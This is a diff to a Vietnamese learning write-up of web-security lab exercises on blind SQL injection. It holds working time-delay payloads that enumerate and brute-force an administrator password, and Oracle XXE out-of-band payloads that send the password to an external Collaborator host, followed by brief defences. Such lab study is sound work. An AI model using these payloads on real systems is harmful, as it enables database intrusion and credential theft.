@@ -1,7 +1,7 @@
 # SQL-Injection-Basic
 
 ## Người thực hiện: Mai Anh
-## Cập nhật: 04/08/2025 
+## Cập nhật: 18/08/2025 
 1. Biết các phát hiện các trường hợp SQL INJECTION
 2. Hiểu được nguyên nhân gây ra lỗi và tìm ra cách khai thác chi tiết
 3. Biết được các lỗi từ các câu truy vấn phổ biến
@@ -301,11 +301,90 @@ vaf sửa lại query để lộ mật khẩu
   '; IF (1=2) WAITFOR DELAY '0:0:10'--
   '; IF (1=1) WAITFOR DELAY '0:0:10'--
   ```
+**Lab: Blind SQL injection with time delays**
+```
+  TrackingId=uIN3uMisJH9698Nb'||pg_sleep(10)--
+```
+<img width="1499" height="804" alt="image" src="https://github.com/user-attachments/assets/dab7ed34-173a-4690-a3fe-45793e34df24" />
+
++ || là toán tử nối chuỗi trong PostgreSQL.
++ pg_sleep(10) làm database ngủ 10 giây.
+> Truy vấn chạy bình thường nhưng server delay đúng 10 giây.
+
+**Lab: Blind SQL injection with time delays and information retrieval**
+- Kiểm tra điều kiện
+  ```
+  TrackingId=0gJOuXb4yHVsqFqy'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;
+  ```
+<img width="1486" height="663" alt="image" src="https://github.com/user-attachments/assets/ebc7fef5-ef33-4dfd-9ac2-b73355bfc78e" />
++ Điều kiện CASE WHEN (1=1) → luôn đúng → database sẽ ngủ 10 giây.
++ Server phản hồi chậm 10 giây → chứng minh SQL Injection tồn tại.
+  
+  ```
+  TrackingId=0gJOuXb4yHVsqFqy'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;
+  ```
+<img width="1477" height="797" alt="image" src="https://github.com/user-attachments/assets/d2af16ee-1783-4a35-8045-cee2d02b09ef" />
++ 1=2 luôn sai → database sẽ chạy pg_sleep(0) (không ngủ).
++ Server phản hồi ngay lập tức 
+
+- Kiểm tra user "administrator" có tồn tại
+```
+TrackingId=0gJOuXb4yHVsqFqy'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+<img width="1488" height="735" alt="image" src="https://github.com/user-attachments/assets/f379d2ad-9078-45e4-a846-6c11aea732b4" />
++ nếu có user "administrator" → server sẽ delay 10 giây.
+> server bị delay 10 giây nên => user administrator có tồn tại
+
+- Kiểm tra độ dài mật khẩu 
+```
+TrackingId=0gJOuXb4yHVsqFqy'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+<img width="1463" height="785" alt="image" src="https://github.com/user-attachments/assets/05ad78b9-658e-4b05-9705-4b9a6d300557" />
++ Server delay 10s r trả kết quả nền mật khẩu dài hơn 1 kí tự
++ Lần lượt tăng số mật khẩu và thử cho đến khi server không bị delay thì đó là số  kí tự của mật khẩu
+<img width="1484" height="782" alt="image" src="https://github.com/user-attachments/assets/a7a426ae-953f-436f-8083-bf6f10f15ec3" />
+> Mật khẩu có 20 kí tự
+
+- Dò mật khẩu bằng Intruder
+<img width="1919" height="829" alt="image" src="https://github.com/user-attachments/assets/bf27e8a8-0805-47b1-8d5d-6bc62609baf7" />
+
+<img width="1767" height="782" alt="image" src="https://github.com/user-attachments/assets/f7c14d9a-fc66-47f6-a696-07698c087d69" />
+
+> Tìm được mật khẩu là bxr94d3tfvy6wr8qxe6j
+<img width="1848" height="636" alt="image" src="https://github.com/user-attachments/assets/d33481d1-00e2-4db1-ad1f-012e38b63412" />
+
 - **Khai thác blind SQL injection bằng kỹ thuật out-of-band (OAST)**
   Khi ứng dụng thực thi truy vấn không đồng bộ hoặc phản hồi không phụ thuộc vào dữ liệu/lỗi/thời gian → các kỹ thuật trước sẽ thất bại.
   => Kích hoạt tương tác mạng ra ngoài (DNS, HTTP…) tới máy chủ do kẻ tấn công kiểm soát, từ đó:
   + Suy ra điều kiện.
   + Hoặc exfiltrate (rò rỉ) dữ liệu trực tiếp qua yêu cầu mạng.
+
+ **Lab: Blind SQL injection with out-of-band interaction**
+- Dùng Burp Suite để chặn request có chứa cookie TrackingId.
+- Chèn payload SQL nhằm ép cơ sở dữ liệu Oracle phân tích một đoạn XML có khai báo external entity.
+<img width="1505" height="774" alt="image" src="https://github.com/user-attachments/assets/9a52612c-1e77-4911-905b-9f0e78c6eebe" />
+```Payload
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//hwhumh7je7ncilih1a1r73r6dxjp7jv8.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+<img width="1919" height="753" alt="image" src="https://github.com/user-attachments/assets/dad435a3-5cf3-44c6-b9d4-21a86b025ee4" />
+- Khi câu lệnh được thực thi, DB sẽ gửi request HTTP/DNS ra ngoài đến domain Collaborator.
+- Kiểm tra tab Collaborator, Collaborator ghi nhận được 2 kết nối (HTTP và DNS).
+<img width="1857" height="915" alt="image" src="https://github.com/user-attachments/assets/cfdcbdd6-2c4d-41cd-95aa-6489d8fe9694" />
+> Ứng dụng tồn tại lỗ hổng SQLi dạng out-of-band.
+
+**Lab: Blind SQL injection with out-of-band data exfiltration**
+- Sử dụng payload kết hợp SQLi + XXE. Payload sẽ lấy mật khẩu của admin trong DB và chèn nó vào một request gửi về server Burp Collaborator.
+```Payload
+  '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||            (SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.1ike81t30r9w4541nunbtndqzh59t4ht.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+<img width="1919" height="868" alt="image" src="https://github.com/user-attachments/assets/aefac023-762e-4a4d-93b4-553e340a8cb8" />
+- Sau khi gửi request bằng payload trên, mở tab Collaborator trong Burp rồi nhấn Poll now.
+Một lúc sau, sẽ thấy có các request DNS/HTTP trả về từ server. Trong phần subdomain của request đó có chứa chính là mật khẩu admin.
+<img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/8201e01a-4e37-41bd-9064-b164b799a565" />
+<img width="859" height="213" alt="image" src="https://github.com/user-attachments/assets/3bf25b2e-f293-464e-a280-1419f5c22a70" />
+- Vậy mật khẩu admin là : 63r0abq1y0g7d07g1r58
+- Vào mục My account, đăng nhập với username administrator và mật khẩu vừa lấy được → Đăng nhập thành công.
+<img width="1862" height="803" alt="image" src="https://github.com/user-attachments/assets/682dfce8-1eb7-45b6-8a7f-1a1827c4cda1" />
 ##  4. Các biện pháp phòng chống giống với SQLi thông thường:
 - Sử dụng truy vấn tham số hóa (parameterized queries) để tách dữ liệu nhập từ cấu trúc câu lệnh SQL.
 - Không ghép chuỗi trực tiếp dữ liệu đầu vào vào câu truy vấn.
